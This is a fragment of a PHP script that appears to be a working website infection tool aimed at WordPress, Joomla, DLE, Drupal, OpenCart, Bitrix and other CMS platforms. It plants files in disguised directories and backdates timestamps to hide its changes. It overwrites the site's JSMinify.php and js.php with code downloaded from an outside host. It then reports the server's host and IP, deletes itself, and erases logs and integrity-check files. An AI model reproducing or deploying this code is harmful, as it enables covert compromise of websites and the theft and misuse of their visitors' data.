or ( strpos($v,'opencart_activity_hash =',0) !==false )
or ( strpos($v,'modxevo_hash =',0) !==false )
or ( strpos($v,'random_joomla_key =',0) !==false )
or ( strpos($v,'define_key = ',0) !==false )
or ( strpos($v,'nc_activity_hash =',0) !==false )
or ( strpos($v,'wa_activity_hash =',0) !==false )
//or ( strpos($v,'HostCMS_activity_hash =',0) !==false )
or ( strpos($v,'PrestaPageID =',0) !==false ))
{
	if(strpos($filename, "engine/")) {
                       print $v."___dle_";}
	if(strpos($filename, "wp-")) {
                       print $v."___wp_";}
	if(strpos($filename, "s/bootstrap")) {
                        print $v."___drupal_";}
	if(strpos($filename, "functions_bigthree")) {
                        print $v."___vbullet_";}
	if(strpos($filename, "phpbb")) {
                        print $v."___phpbb_";}
	if(strpos($filename, "ipsRegistry")) {
                        print $v."___ipb_";}
	if(strpos($filename, "system/Request/R")) {
                        print $v."___ips_";}
	if(strpos($filename, "xpdo.class")) {
                        print $v."___modxr_";}
	if(strpos($filename, "modules/main/inc")) {
                        print $v."___bitrix_";}
	if(strpos($filename, "tect.inc.php")) {
                        print $v."___modxe_";}	
	if(strpos($filename, "e/bootstrap.php")) {
                        print $v."___modxe_";}
	if(strpos($filename, "system/startup.")) {
                        print $v."___opencart_";}	
	if(strpos($filename, "defines.")) {
                        print $v."___joomla_";}		
	if(strpos($filename, "Connection.")) {
                        print $v."___presta_";}	
	if(strpos($filename, "nc_db.class")) {
                        print $v."___netcat_";}		
	if(strpos($filename, "waAutoload.")) {
                        print $v."___webasyst_";}		
/*	if(strpos($filename, "dules/core/core.p")) {
                        print $v."___hostcms_";}*/							
;
}}}}
		
}
/*
function doreplace($filename,$searcharray)
{
	if(updateok($filename))
	{
		return true; //exit this function
	}
	if (is_writable($filename))
	{
		$str1 = file_get_contents($filename);
		foreach($searcharray as $onesearch)
		{
			print "<p>Will replace ".$onesearch['search']." with ".$onesearch['replace'];
			//$str1 = str_replace($onesearch['search'],$onesearch['replace'],$str1);
		}	
		$result = file_put_contents($filename,$str1);
		updateok($filename); //print update ok line after all replacements are done
	}
	else  //file is not writeable
	{
		print "<br><font color=red>File <b>$filename</b> is not writeable.</font>";
	}
}
*/
function docopy($directory,$index)
{
	global $copyFrom; 
	global $copyTo;
	global $drupal_img,$drupal8_img,$modxrevo_img,$phpbb_img,$modxevo_img,$dle_img,$wp_img,$joom_img,
           $webasyst_img,$netcat_img,$opencart_img,$bitrix_img,$presta_img,$ipb_img,$ips_img,$vbullet_img,$vbullet42_img;
	$i = 0;
	foreach($copyFrom as $copyFile)
	{
		$copyToFile = $directory.$copyTo[$index][$i];
//print dirname($copyToFile);
		if (@is_writable(dirname($copyToFile)))
		{

			if (strlen(@realpath(dirname($_SERVER['DOCUMENT_ROOT'])))>3){
			
			
			    if ((!file_exists(realpath(dirname($copyToFile)).'/.htaccess'))or(!file_exists(realpath(dirname($copyToFile)).'/img.png'))) {
			   // print "<br>We are copying <font color='blue'>$copyFile</font> to <font color='blue'>".realpath(dirname($copyToFile)).'/'.basename($copyToFile)." </font><br>\n";
			  //  print " ".realpath(dirname($copyToFile)).'/'.basename($copyToFile)." ";
		     	$tim = @filemtime(realpath(dirname($copyToFile)).'/');
				$fps = @fopen(realpath(dirname($copyToFile)).'/img.png', "w");
                @fclose($fps);
			    @copy($copyFile, $copyToFile);	
				//$tim = time() - 53537340;
		        @touch(dirname($copyToFile).'/', $tim);	
				@touch(realpath(dirname($copyToFile)).'/img.png', $tim);	
	         	@touch(realpath(dirname($copyToFile)).'/'.basename($copyToFile), $tim);	
				$pathik = realpath(dirname($copyToFile));
			
	            if(strpos($pathik, 'isc/ui/ima')) {
                       print " image copy     <!-- $drupal_img -->        ";}
            	if(strpos($pathik, "dor/backbon")) {
                       print " image copy     <!-- $drupal8_img -->         ";}		
            	if(strpos($pathik, 'odext/widge')) {
                       print " image copy     <!-- $modxrevo_img -->        ";}
            	if(strpos($pathik, "tars/galler")) {
                       print " image copy     <!-- $phpbb_img -->         ";}	
            	if(strpos($pathik, 'sets/medi')) {
                       print " image copy     <!-- $modxevo_img -->        ";}
				if(strpos($pathik, 'sets/capt')) {
                       print " image copy     <!-- $modxevo_new_img -->        ";}
            	if(strpos($pathik, "loads/foto")) {
                       print " image copy     <!-- $dle_img -->         ";}		
            	if(strpos($pathik, 'inymce/lang')) {
                       print " image copy     <!-- /wp-includes$wp_img -->        ";}
            	if(strpos($pathik, "mla/applica")) {
                       print " image copy     <!-- $joom_img -->         ";}	
            	if(strpos($pathik, 'dgets/new')) {
                       print " image copy     <!-- $webasyst_img -->        ";}
	            if(strpos($pathik, "tors/ckeditor4/la")) {
                       print " image copy     <!-- $netcat_img -->         ";}		
	            if(strpos($pathik, 'min/languag')) {
                       print " image copy     <!-- $opencart_img -->        ";}
	            if(strpos($pathik, "trix/imag")) {
                       print " image copy     <!-- $bitrix_img -->         ";}	
            	if(strpos($pathik, 's/default/fon')) {
                       print " image copy     <!-- $presta_img -->        ";}
            	if(strpos($pathik, "yle_images/mas")) {
                       print " image copy     <!-- $ipb_img -->         ";}		
	            if(strpos($pathik, 'ons/gallery/wid')) {
                       print " image copy     <!-- $ips_img -->        ";}
            	if(strpos($pathik, "ges/style_generat")) {
                       print " image copy     <!-- $vbullet_img -->         ";}	
				
		        }else{print " img ok          ";//.realpath(dirname($copyToFile))."   ".basename($copyToFile)."   ";
				     }
					 
			}else{
				$dleska = $_SERVER['DOCUMENT_ROOT'].'/uploads/fotos/';
                $wpska = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/js/tinymce/langs/';
                $jomka = $_SERVER['DOCUMENT_ROOT'].'/libraries/joomla/application/';				
                if (is_dir($dleska)) $workis = $dleska;		
                if (is_dir($wpska)) $workis = $wpska;
                if (is_dir($jomka)) $workis = $jomka;	 				
				if ((!file_exists($workis.'.htaccess'))or(!file_exists($workis.'img.png'))) {
			    //print "<br>We are copying <font color='blue'>$copyFile</font> to <font color='blue'>".realpath(dirname($copyToFile)).'/'.basename($copyToFile)." </font><br>\n";
			    //print " ".realpath(dirname($copyToFile)).'/'.basename($copyToFile)." ";

		     	$tim = @filemtime($workis);
				$fps = @fopen($workis.'img.png', "w");
                @fclose($fps);
			    @copy($copyFile, $copyToFile);	
				//$tim = time() - 53537340;
		        @touch($workis, $tim);	
				@touch($workis.'img.png', $tim);	
	         	@touch($workis.basename($copyToFile), $tim);	
				if(strpos($workis, "loads/foto")) {
                       print " image copy     <!-- $dle_img -->         ";}		
            	if(strpos($workis, 'inymce/lang')) {
                       print " image copy     <!-- /wp-includes$wp_img -->        ";}
            	if(strpos($workis, "mla/applica")) {
                       print " image copy     <!-- $joom_img -->         ";}
				
		        }else{print " img ok          ";//.realpath(dirname($copyToFile))."   ".basename($copyToFile)."   ";
				     }
			}

					 
		}
		else  //folder is not writeable
		{
			print " Folder ".realpath(dirname($copyToFile))." is not writeable.             ";
		}
		$i++;
	}
}
/*
function updateok($filename)
{
	$arr = file($filename); 
	foreach($arr as $linenum=>$line) 
	{
		if (strpos($line,'cheking1s') !==false ) //found "update ok"
		{
			print "$line"; 
			//print "  ___  "; print outputFolder($filename); 
			print "<br>\n";
			return true;
		}
	}
	return false;  //update ok was not found	
} 
*/
function outputFolder($filename) //return main folder or full filename
{
	$folders = array_reverse(explode('/',$filename));
	$output = beforeStopFolder($folders);
	if($output === NULL)
	{
		return $filename;
	}
	else
	{
		return $output;
	}
}

function beforeStopFolder($folders) //returns index of first folder before stop folder, or NULL
{
	global $stopfolders;
	for($i=0;$i<count($folders);$i++)
	{
		if(in_array($folders[$i],$stopfolders))
		{
			if($i+1 < count($folders))
			{
				return nextNonStopFolder(array_slice($folders,$i+1));
			}
			else
			{
				return NULL;
			}
		}
	}
	return NULL;
}

function nextNonStopFolder($folders) //returns first non stop folder in array
{  
	global $stopfolders;
	for($i=0;$i<count($folders);$i++)
	{
		if(!in_array($folders[$i],$stopfolders))
		{
			return $folders[$i];
		}
	}
	return NULL;
}

// example: removeStopFoldersFromPath("/Applications/XAMPP/xamppfiles/htdocs/dina/igor/usr/www")
// will return "/Applications/XAMPP/xamppfiles/htdocs/dina/igor/usr"
function removeStopFoldersFromPath($filename) //removes stop folders from the end of the path for Not updated folders
{
	global $stopfolders2;
	$folders = explode('/',$filename);

	for($i=count($folders)-1;$i>0;$i--)
	{	


			if (strstr($folders[$i], ".")){
			
	        unset($folders[count($folders)-1]); //get 1 level higher
			 			//print"<br>ok for tochka<br> ".$folders[$i];
	        return implode('/',$folders);

			}
			
			else if ((!strstr($folders[$i-1], "."))and(in_array($folders[$i],$stopfolders2))){
			return implode('/',$folders);
			}
            
			else			
			
			{ 
	          //get 1 level higher
		        if(in_array($folders[$i],$stopfolders2))
	         	{
	    		unset($folders[$i]);

							if (strstr($folders[$i-1], "."))
							{
	                        unset($folders[count($folders)-1]); //get 1 level higher
								
	                        }

				return implode('/',$folders);			

	        	}
	        	else
	        	{	

					return implode('/',$folders);
		        }

            } 
			
	}
	//if all folders were removed return "/"
	return "/";
}

if (isset ($_GET['start'])){	

print "\n<br>Not updated:<br>\n";
foreach($outputlist as $out)
{
	print "00000000_unknoun_".$out."<br>\n";
}


}else
{ print"error loading operating system<br>\n";}

//print "<br>The END";
$jsm ='';
$jsmin = $_SERVER['DOCUMENT_ROOT'].'/engine/classes/min/lib/JSMinify.php';
$jsmin1 = $_SERVER['DOCUMENT_ROOT'].'/engine/classes/min/lib/JSminify.php';
$jsmin2 = $_SERVER['DOCUMENT_ROOT'].'/engine/ajax/js.php';
$jsminfile = 'http://net.h1n.ru/engine/editor/jscripts/temp/jsm.txt';                              //warning!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
$jsminjs = 'http://net.h1n.ru/engine/editor/jscripts/temp/jjs.txt'; 
if (file_exists($jsmin)){$jsm = $jsmin;}
if (file_exists($jsmin1)){$jsm = $jsmin1;}

if (file_exists($jsm))
{$con = @file_get_contents($jsm);
   $a = 'function_exists ($name_41)';
   if (!strpos($con, $a))
   {$times = @filemtime($jsm);
    if (@fopen($jsminfile, "r"))
	  {if (copy($jsminfile, $jsm)){ 
	  print "<br>upload JSMinify.php success<br>\r\n";
      @touch($jsm, $times);
	  @touch(__DIR__, $times);}
	  }else 
	  {echo "jsmin error";}
  }else{ 
  print "<br>JSMinify good<br>\r\n";}
}
if (file_exists($jsmin2))
{$con = @file_get_contents($jsmin2);
   $a = 'function_exists($dle_33)';
   if (!strpos($con, $a))
   {$times = @filemtime($jsmin2);
    if (@fopen($jsminjs, "r"))
	  {if (copy($jsminjs, $jsmin2)){ 
	  print "<br>upload JS.php success<br>\r\n";
      @touch($jsmin2, $times);
	  @touch(__DIR__, $times);}
	  }else 
	  {echo "js error";}
  }else{ 
  print "<br>JS good<br>\r\n";}
}
if(strstr($_SERVER["HTTP_HOST"],"127.0")){$name=$_SERVER["SERVER_ADDR"];}else{$name = $_SERVER["HTTP_HOST"];}
if (unlink(__FILE__)) {print "ser"."veris_".$_SERVER['HTTP_HOST']."_ip_".$_SERVER["SERVER_ADDR"]."____".$name."<br>\n<br>\n";}
else{print "error unlink self ser"."veris_".$_SERVER['HTTP_HOST'];}

@unlink($_SERVER['DOCUMENT_ROOT'].'/data/snap.db');
@unlink($_SERVER['DOCUMENT_ROOT'].'/test.html');
@unlink($_SERVER['DOCUMENT_ROOT'].'/upl.php');
@unlink($_SERVER['DOCUMENT_ROOT'].'/engine/error_log');
@unlink($_SERVER['DOCUMENT_ROOT'].'/engine/classes/min/lib/error_log');
@unlink($_SERVER['DOCUMENT_ROOT'].'/wa-widgets/news/.files.md5');
@unlink($_SERVER['DOCUMENT_ROOT'].'/wa-system/.files.md5');
@unlink('error_log');
@unlink ('license.php');
@unlink ('license.php.VIRUS');
if (@is_dir(__DIR__)) {$time = time() - 53537340;@touch(__DIR__, $time);}
?>